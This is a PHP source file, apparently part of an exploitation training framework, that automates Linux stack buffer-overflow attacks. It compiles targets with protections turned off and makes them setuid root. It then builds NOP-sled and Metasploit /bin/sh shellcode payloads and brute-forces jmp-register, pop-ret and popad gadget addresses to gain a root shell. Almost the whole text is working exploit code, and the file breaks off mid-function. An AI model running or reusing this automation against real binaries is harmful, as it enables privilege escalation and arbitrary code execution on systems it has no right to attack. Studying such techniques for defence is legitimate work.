<?php

// execstack -s /path/to/myprog
// /var/log/apport.log

/*
 *      The randomize_va_space kernel parameter defines system-wide configuration setting for ASLR. This parameter could be set to the following values: 
    0 - ASLR is turned OFF 
    1 - ASLR is turned ON (stack randomization)
    2 - ASLR is turned ON (stack, heap, and mmap allocation randomization)
    
    
    -fstack-protector - enable checks for functions with character buffers of size 8B or higher
    -fstack-protector-all - enable checks for all functions (recommended)
    -fno-stack-protector - disable stack protection checks
    -Wstack-protector - emit warnings for all unprotected functions (recommended)
    --parm=ssp-buffer-size=<size_in_bytes> - modifies the default 8B buffer length

    GCC versions 4.x include SSP techniques in their native implementations. Prior 3.x versions had this feature enabled through a patch.
    
    
    Protections We Face: ASLR
- Address Space Layout Randomization
- Randomizes base address of all shared objects (static, dynamic, and virtual), stack (on exec*), mmap/(s)brk for heap, etc.
- Hardcoded addresses mostly obsolete (see PIE and vsyscall/vdso)
 */

// faire argv_envp.c pour voir les argv[0], argv[1], envp[0], envp[1]
// the execv() function that preserves environment vars
// process_env_vars($vmem,$profile,$pid);
/*
 *(gdb) x/s *((char **)environ)
 *(gdb) x/s *((char **)argv) =(gdb) x/s((char *)argv[0])
 *(gdb) x/s((char *)argv[1])
 *
 * /proc/<PID>/environ
 *
 */
// ================== VARIABLE ENVIRONNEMENT =================================================
class ret2stack4linux extends bin4linux{
	
	
	public function __construct($bin_bof) {
	    $name = __CLASS__;
	    $rep_path = "/tmp/$name";
	    if (!is_dir($rep_path)) $this->create_folder($rep_path);
	    $obj_file = new FILE($bin_bof);
	    $query = "cp -v $bin_bof $rep_path";
	    $this->requette($query);
	    $new_bin = "$rep_path/$obj_file->file_name$obj_file->file_ext";
	    parent::__construct($new_bin);
	}
	


	
	function ret2stack4linux_setuid() {
		ssTitre("Setuid");
 		net("http://fr.wikipedia.org/wiki/Setuid");
		 
		$programme = prog_compile ( "buf_after", "-fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static " );
		titre ( "to Be Root" );
		$overflow = linux_prog_fuzzeling ( $programme ); // pause();
		$offset_eip = offset_eip ( $programme, $overflow );
$this->requette("ls -al $programme" ); // pause();
$this->requette("echo '$this->root_passwd' | sudo -S chown root:root $programme" );
$this->requette("ls -al $programme" ); // pause();
$this->requette("echo '$this->root_passwd' | sudo -S chmod u+s $programme" );
$this->requette("ls -al $programme" ); // pause();
		$shellcode_hex = shellcode_msf2root ( "/bin/sh" );
		$size_shellcode = shellcode_hex2size ( $shellcode_hex );
		$nops = ($offset_eip - $size_shellcode);
		article ( "(Offset - shellcode )", " ( $offset_eip - $size_shellcode) = $nops " );
		titre ( "Execution du payload" );
		graphic_payload_before ();
		$cmd = "python -c 'print \"\\x90\"*$nops+\"$shellcode_hex\"+\"$addr_rev\"'";
		$query = "$programme `$cmd`";
		article ( "Chance", "1/1" );
		payload_check_norme ( "$shellcode_hex$addr_rev" );
$this->requette($query );
		// pause();
	}
	

	
	public function ret2stack4linux_all($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max){	
		$this->gtitre("STACK LINUX JMP ESP ALL");
	$this->cmd("localhost", "$this->file_path `python -c 'print \"\x41\"*131072'`");
	$this->cmd("localhost", "$this->file_path `python -c 'print \"\x41\"*131071'`");
	$this->pause();	
	$this->elf2stack2size();
	
	$this->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);
	$this->pause(); // OK	
	return "";
	/*
	$this->ret2stack4linux4jmp2esp4sc_after_egghunter($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);
	$this->pause();// OK	                                                                                                                                    
	$this->ret2stack4linux4jmp2esp4sc_before_egghunter($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);
	$this->pause();// OK	                                                                                                                                     
	$this->ret2stack4linux4jmp2esp4sc_before_jmp_backward($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);
	$this->pause();// OK
	*/
	foreach($this->all_reg_32 as $reg) {
		// 14/29 - EBX: 0x08092b17 - OK
		// 20/57 - EDX: 0x080820b7
		// 22/57 - EDX: 0x08084347 - OK
		// 28/170 - EAX: 0x0805209e
		// 29/170 - EAX: 0x08052596
		// 66/170 - EAX: 0x08095ac5
		// 73/170 - EAX: 0x0809bb2d
		// 77/170 - EAX: 0x0809c261
		// 89/170 - EAX: 0x0809ff6b
		// 90/170 - EAX: 0x080a0b08
		// 98/170 - EAX: 0x080aa0aa
		// 105/170 - EAX: 0x080aca04
		
		// Pas La PEINE EIP -> ESP -> REG 
		// $this->ret2stack4linux4jmp2esp4sc_before_jmp_reg($reg,$offset_eip, $dll, $header,$shellcode, $footer, $exploit_size_max);$this->pause();
	}
	
	
	$this->gtitre("STACK LINUX JMP REG ALL");
		foreach($this->all_reg_32 as $reg) {
		// 04/29 - EBX: 0x0805c3de
		// 27/29 - EBX: 0x080e8c1b
		// 13/57 - EDX: 0x080817e0
		// 14/57 - EDX: 0x08081828
		// 33/57 - EDX: 0x0808abbf
		// 48/57 - EDX: 0x080bd95a
		
		$this->ret2stack4linux4jmp2reg($reg,$offset_eip, $dll, $header,'\x31\xc0\xb4\x10\x29\xc4\x90'.$shellcode, $footer, $exploit_size_max);$this->pause();	 // OK                                                                                                                     
		$this->ret2stack4linux4jmp2reg4add($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause(); // OK
		$this->ret2stack4linux4jmp2reg4sub($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause(); // OK		                                                                                                                    
		$this->ret2stack4linux4jmp2reg4short_jmp($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause(); // OK
		$this->ret2stack4linux4jmp2reg4offset($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause(); // Aucune	                                                                                                                         
		$this->ret2stack4linux4jmp2reg4pop1ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();	 // OK	                                                                                                                              
		$this->ret2stack4linux4jmp2reg4pop2ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();	 // OK                                                                                                                             
		$this->ret2stack4linux4jmp2reg4pop3ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();	 // OK                                                                                                                             
		$this->ret2stack4linux4jmp2reg4pop8ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();	 // Aucune
	
		
		}
	
	
		//$this->gtitre("STACK LINUX POP ALL");
		// Aucune
		//$this->img("$this->dir_img/bof/pop_ret_and_pop_pop_ret.png");
		//$this->ret2stack4linux4pop1ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();
		//$this->ret2stack4linux4pop2ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();
		//$this->ret2stack4linux4pop3ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();
		//$this->ret2stack4linux4pop8ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);$this->pause();
	$this->notify("END ".__FUNCTION__);
	}

	
	



	public function ret2stack4linux4jmp2reg($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	
	$this->chapitre("EIP JMP TO REGISTER $reg");
	$nop = "\\x90";
	//$shellcode = "\x31\xc0\xb4\x10\x29\xc4\x90".$shellcode;
	$this->ssTitre("SHELLCODE SIZE");$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size-$size_shellcode)+\"$shellcode\"";
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP REG\"'");
	$this->pause();
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$i = 1;
	$total_reg = count($tab_reg);
	foreach($tab_reg as $reg_addr) {
		$reg_addr = trim($reg_addr);
		$addr_reg = $this->hex2rev_32($reg_addr);
		$this->article("$i/$total_reg - $reg", $reg_addr);
		//$this->requette("gdb -q --batch -ex \"info symbol $reg_addr\" $this->file_path");
		$cmd = "python -c 'print $header+\"$addr_reg\"'";
		$query = "$this->file_path `$cmd`";
		//$this->payload2check4norme("$shellcode$addr_reg");
		$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP REG\"'");
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		$i ++;
		// pause();
	}
}





	public function ret2stack4linux4jmp2reg4pop1ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	
	$this->gtitre(" $reg and POP ");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size-4)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 4 + $size_shellcode + $footer_size);
	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP RET\"))+\"POP RET\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop1ret4all($reg,$dll);
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	$total_pop = count($tab_pop);
	for($i = 0; $i < $total_reg; ) {
		$reg_addr = trim($tab_reg [$i]);
		$addr_reg = $this->hex2rev_32($reg_addr);
		for($j = 0; $j < $total_pop; ) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			
			$this->article($i++."/$total_reg - $reg", $reg_addr);
			$this->article($j++."/$total_pop - POP RET", $pop_addr);
			$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
			$cmd = "python -c 'print $header+\"$addr_pop\"+\"$addr_reg\"+$footer'";
			$query = "$this->file_path `$cmd`";
			//$this->payload2check4norme("$shellcode$addr_reg");
			$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP RET\"))+\"POP RET\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
			$this->requette($query);
			//$this->elf2debug4payload($cmd);
			// pause();
		}
	}
	$this->titre("END ".__FUNCTION__);
}


	public function ret2stack4linux4jmp2reg4pop2ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->gtitre(" $reg and POP POP RET ");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size-8)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 8 + $size_shellcode + $footer_size);
	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP POP RET\"))+\"POP POP RET\"+\"BBBB\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop2ret4all($reg,$dll);
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	$total_pop = count($tab_pop);
	for($i = 0; $i < $total_reg;) {
		$reg_addr = trim($tab_reg [$i]);
		$addr_reg = $this->hex2rev_32($reg_addr);
		for($j = 0; $j < $total_pop; ) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			
			$this->article($i++."/$total_reg - $reg", $reg_addr);
			$this->article($j++."/$total_pop - POP POP RET", $pop_addr);
			$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
			$cmd = "python -c 'print $header+\"$addr_pop\"+\"BBBB\"+\"$addr_reg\"+$footer'";
			$query = "$this->file_path `$cmd`";
			//$this->payload2check4norme("$shellcode$addr_reg");
			$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP POP RET\"))+\"POP POP RET\"+\"BBBB\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
			$this->requette($query);
			//$this->elf2debug4payload($cmd);
			// pause();
		}
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4jmp2reg4pop3ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("$reg and POP POP POP RET");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size-4-8)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 12 + $size_shellcode + $footer_size);
	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP POP POP RET\"))+\"POP POP POP RET\"+\"BBBB\"+\"CCCC\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop3ret4all($reg,$dll);
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	$total_pop = count($tab_pop);
	for($i = 0; $i < $total_reg; ) {
		$reg_addr = trim($tab_reg [$i]);
		$addr_reg = $this->hex2rev_32($reg_addr);
		for($j = 0; $j < $total_pop; ) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			
			$this->article($i++."/$total_reg - $reg", $reg_addr);
			$this->article($j++."/$total_pop - POP POP POP RET", $pop_addr);
			$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
			$cmd = "python -c 'print $header+\"$addr_pop\"+\"BBBB\"+\"CCCC\"+\"$addr_reg\"+$footer'";
			$query = "$this->file_path `$cmd`";
			//$this->payload2check4norme("$shellcode$addr_reg");
			$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP POP POP RET\"))+\"POP POP POP RET\"+\"BBBB\"+\"CCCC\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
			$this->requette($query);
			//$this->elf2debug4payload($cmd);
			// pause();
		}
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4jmp2reg4pop8ret($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	
	$this->gtitre("$reg and POPAD ");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size-32)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 32 + $size_shellcode + $footer_size);
	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POPx8 RET\"))+\"POPAD RET\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop8ret4all($dll);
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	$total_pop = count($tab_pop);
	for($i = 0; $i < $total_reg; ) {
		$reg_addr = trim($tab_reg [$i]);
		$addr_reg = $this->hex2rev_32($reg_addr);
		for($j = 0; $j < $total_pop; ) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			
			$this->article($i++."/$total_reg - $reg", $reg_addr);
			$this->article($j++."/$total_pop - POPAD RET", $pop_addr);
			$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
			$cmd = "python -c 'print $header+\"$addr_pop\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"$addr_reg\"+$footer'";
			$query = "$this->file_path `$cmd`";
			//$this->payload2check4norme("$shellcode$addr_reg");
			$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POPAD RET\"))+\"POPx8 RET\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
				
			$this->requette($query);
			//$this->elf2debug4payload($cmd);
			// pause();
		}
	}
	$this->titre("END ".__FUNCTION__);
}

	
	public function ret2stack4linux4pop1ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("EIP POP RET TO  SHELLCODE");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$junk\"*($offset_eip-$header_size)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 4);
	// $footer = "\"BBBB\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"" ;
	$footer = "\"BBBB\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP RET\"+\"BBBB\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop1ret4all($dll);
	$total_pop = count($tab_pop);
	for($j = 0; $j < $total_pop; ) {
		$pop_addr = trim($tab_pop [$j]);
		$addr_pop = $this->hex2rev_32($pop_addr);
		$this->article($i++."/$total_pop - POP RET", $pop_addr);
		$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
		$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
		$query = "$this->file_path `$cmd`";
		//$this->payload2check4norme("$shellcode$addr_reg");
		$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP RET\"+\"BBBB\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
		
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4pop2ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("EIP POP POP RET TO  SHELLCODE");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 8);
		$footer = "\"BBBB\"+\"CCCC\"+\"$nop$nop$nop$nop\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP POP RET\"+\"BBBB\"+\"CCCC\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop2ret4all($dll);
	$total_pop = count($tab_pop);
	for($j = 0; $j < $total_pop; ) {
		$pop_addr = trim($tab_pop [$j]);
		$addr_pop = $this->hex2rev_32($pop_addr);
		$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
		$this->article($j++."/$total_pop - POP POP RET", $pop_addr);
		$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
		$query = "$this->file_path `$cmd`";
		//$this->payload2check4norme("$shellcode$addr_reg");
	$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP POP RET\"+\"BBBB\"+\"CCCC\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
		
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4pop3ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("EIP POP POP POP RET TO SHELLCODE");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 12);
	$footer = "\"BBBB\"+\"CCCC\"+\"DDDD\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP POP POP RET\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop3ret4all($dll);
	$total_pop = count($tab_pop);
	for($j = 0; $j < $total_pop; ) {
		$pop_addr = trim($tab_pop [$j]);
		$addr_pop = $this->hex2rev_32($pop_addr);
		$this->article($j++."/$total_pop - POP POP POP RET", $pop_addr);
		$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
		$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
		$query = "$this->file_path `$cmd`";
		//$this->payload2check4norme("$shellcode$addr_reg");
		$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP POP POP RET\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
		
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4pop8ret($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("EIP POPAD RET TO SHELLCODE");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size)";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 32);
	$footer = "\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"IIII\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POPAD RET\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"IIII\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	$this->pause();
	$tab_pop = $this->elf2pop8ret4all($dll);
	$total_pop = count($tab_pop);
	for($j = 0; $j < $total_pop; ) {
		$pop_addr = trim($tab_pop [$j]);
		$addr_pop = $this->hex2rev_32($pop_addr);
		$this->article($j++."/$total_pop - POPAD RET", $pop_addr);
		$this->requette("gdb -q --batch -ex \"info symbol $pop_addr\" $this->file_path");
		$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
		$query = "$this->file_path `$cmd`";
		//$this->payload2check4norme("$shellcode$addr_reg");
	$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POPAD RET\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"IIII\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
		
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4jmp2reg4add($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("ADD TO REGISTER $reg and JUMP");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$nop_repeat_tmp = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size);
	$jmp_int =(int)(($offset_eip +($nop_repeat_tmp / 2)) / 100);
	$opcode_hex = $this->asm2hex("add $reg, 100");
	$opcode_jmp_reg = $this->asm2hex("jmp $reg");
	$this->article("OPCODE ADD", $opcode_hex);
	$this->article("OPCODE JMP $reg", $opcode_jmp_reg);
	$this->article("NOMBRE DE SAUT*100", $jmp_int*100);
	$this->pause();
	$header = "\"$opcode_hex\"*$jmp_int+\"$opcode_jmp_reg\"+\"$nop\"*($offset_eip-$header_size-(3*$jmp_int)-2)";
	
	$nop_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size);
	$footer = "\"$nop\"*$nop_repeat+\"$shellcode\"+\"$footer\"";
	
	$this->article("template", "python -c 'print \"SHORT JMP\"*Z(Z=offset to our shellcode)+\"JMP REG ADDR\"+\"JUNK\"*(\"OFFSET EIP-len(\"SHORT JMP\")*Z-len(\"JMP REG ADDR\"))+\"SHORT JMP\"+\"EIP = JMP REG $reg\"+\"\\x90\"*(MAX EXPLOIT SIZE-(OFFSET_EIP+Shellcode+JUNK+FOOTER))+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	$this->pause();
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	for($i = 0; $i < $total_reg; ) {
		$reg_addr = trim($tab_reg [$i]);
		$addr_reg = $this->hex2rev_32($reg_addr);
		$this->article($i++."/$total_reg - $reg", $reg_addr);
		$this->requette("gdb -q --batch -ex \"info symbol $reg_addr\" $this->file_path");
		$cmd = "python -c 'print $header+\"$addr_reg\"+$footer'";
		$query = "$this->file_path `$cmd`";
		$this->article("template", "python -c 'print \"SHORT JMP\"*Z(Z=offset to our shellcode)+\"JMP REG ADDR\"+\"JUNK\"*(\"OFFSET EIP-len(\"SHORT JMP\")*Z-len(\"JMP REG ADDR\"))+\"SHORT JMP\"+\"EIP = JMP REG $reg\"+\"\\x90\"*(MAX EXPLOIT SIZE-(OFFSET_EIP+Shellcode+JUNK+FOOTER))+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
		
		//$this->payload2check4norme("$shellcode$addr_reg");
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4jmp2reg4offset($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("JMP $reg + Offset -> by ADDR");
	
	$this->article("jmp [reg + offset]", "If there is a  register that points to the buffer containing the shellcode,
	 but it does not point at the beginning of the shellcode, you can also try to find an instruction in one of the OS or application dll’s,
	 which will add the required bytes to the register and then jumps to the register.");
	
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	
	$tab_jmp_reg_offset = $this->elf2reg4offset($reg,$dll);
	foreach($tab_jmp_reg_offset as $addr_jmp_reg_offset) {
